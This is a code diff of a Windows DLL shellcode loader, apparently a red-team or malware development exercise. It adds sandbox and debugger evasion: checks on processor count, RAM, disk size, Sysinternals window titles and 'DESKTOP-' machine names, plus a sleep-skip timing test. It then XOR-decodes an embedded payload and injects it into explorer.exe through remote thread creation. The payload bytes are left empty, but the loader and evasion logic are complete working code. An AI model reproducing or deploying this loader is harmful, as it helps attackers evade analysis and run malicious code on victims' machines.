@@ -2,25 +2,37 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <tlhelp32.h>
 
-char pl_key[] = "";
-unsigned char calc_payload[] = { };
-unsigned int calc_len = sizeof(calc_payload);
+DWORD GetProcessIdByName(const char * processName) {
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
 
-char FIVE(char some, char another) {
-return some ^ another;
-}
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 
-void ONE(char * data, size_t data_len, char * key, size_t key_len) {
-        int j;
-        
-        j = 0;
-        for (int i = 0; i < data_len; i++) {
-                if (j == key_len - 1) j = 0;
-		
-		data[i] = FIVE(data[i], key[j]);
-                j++;
-        }
+	if (Process32First(snapshot, &entry) == TRUE)
+	{
+		while (Process32Next(snapshot, &entry) == TRUE)
+		{
+			if (_stricmp(entry.szExeFile, processName) == 0)
+			{
+				CloseHandle(snapshot);
+				return entry.th32ProcessID;
+			}
+		}
+	}
+
+	CloseHandle(snapshot);
+	return 0;
+} 
+
+BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
+{
+	WCHAR windowTitle[1024];
+	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
+	CharUpperW(windowTitle);
+	if (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;
+	return true;
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
@@ -38,24 +50,74 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpRese
 extern "C" {
 __declspec(dllexport) BOOL WINAPI RunME(void) {
 
-    ONE((char *) calc_payload, calc_len, pl_key, sizeof(pl_key));
+    SYSTEM_INFO systemInfo;
+    GetSystemInfo(&systemInfo);
+    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+    if (numberOfProcessors < 4) return false;
 
-    // Allocate memory
-    LPVOID basePageAddress = VirtualAlloc(NULL, (SIZE_T)calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    GlobalMemoryStatusEx(&memoryStatus);
+    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+    if (RAMMB < 4000) return false;
 
-    if (basePageAddress == NULL) {
-        return 1;
-    }
+    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    DISK_GEOMETRY pDiskGeometry;
+    DWORD bytesReturned;
+    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
+    DWORD diskSizeGB;
+    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+    if (diskSizeGB < 50) return false;
 
-    // Write memory
-    RtlMoveMemory(basePageAddress, calc_payload, (SIZE_T)calc_len);
+	bool debugged = false;
+	EnumWindows(EnumWindowsProc, (LPARAM)(&debugged));
+	if (debugged) return false;
 
-    // Create thread that points to shellcode
-    HANDLE threadHandle;
-    threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)basePageAddress, NULL, 0, NULL);
+    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
+    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    GetComputerNameW(computerName, &computerNameLength);
+    CharUpperW(computerName);
+    if (wcsstr(computerName, L"DESKTOP-")) return false;
 
-    //Wait for the thread to run
-    WaitForSingleObject(threadHandle, INFINITE);
+    const char calc_payload[] = { };
+    char pl_key[] = "";
+	unsigned int calc_len = sizeof(calc_payload);
+
+    DWORD pid = GetProcessIdByName("explorer.exe");
+
+    ULONGLONG uptimeBeforeSleep = GetTickCount();
+    typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
+    LARGE_INTEGER delay;
+    delay.QuadPart = -10000 * 100000; // 100 seconds
+    pNtDelayExecution(FALSE, &delay);
+    ULONGLONG uptimeAfterSleep = GetTickCount();
+    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
+
+	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * calc_len * 2);
+	memcpy(encoded, calc_payload, calc_len);
+
+	unsigned char* decoded = encoded;
+    
+    int j;
+    j = 0;
+	for (int i = 0; i < sizeof calc_payload; i++)
+	{
+        if (j == sizeof(pl_key) - 1) j = 0;
+
+		((char*)decoded)[i] = (((char*)decoded)[i]) ^ pl_key[j];
+        j++;
+	}
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, calc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, decoded, calc_len, NULL);
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
 
     return 0;
     }
